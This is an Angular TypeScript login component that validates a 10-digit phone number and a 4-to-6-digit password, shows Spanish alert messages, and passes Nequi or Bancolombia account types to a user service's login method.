import { ServicesUser } from './../../../service/app.loggin';
import { IUserLoggin } from './../../../interface/user.interface';
import { Component } from '@angular/core';

@Component({
  selector: 'app-loggin',
  templateUrl: './loggin.component.html',
  styleUrls: ['./loggin.component.css'],
})
export class LogginComponent {
  login: boolean = true;
  main: boolean = false;
  user: IUserLoggin = new IUserLoggin();

  constructor(private service: ServicesUser) {}
  validateLenghtId(value: string): boolean {
    return value.length === 10;
  }

  validateLenght(value: string): boolean {
    return value.length >= 4 && value.length <= 6;
  }

  log() {
    this.login = false;
    this.main = true;
    const { phoneNumber, passwords, type } = this.user;
    if (!this.validateLenghtId(phoneNumber)) {
      alert('El numero debe ser almenos 10 numeros');
      return;
    }
    if (!this.validateLenght(passwords)) {
      alert('La contraseña debe ser al menos 4 a 6 digitos');
      return;
    }
    if (type === 'nequi') {
      this.user.type = 'NEQUI';
    } else if (type === 'BANCOLOMBIA') this.service.login(this.user);
  }
}
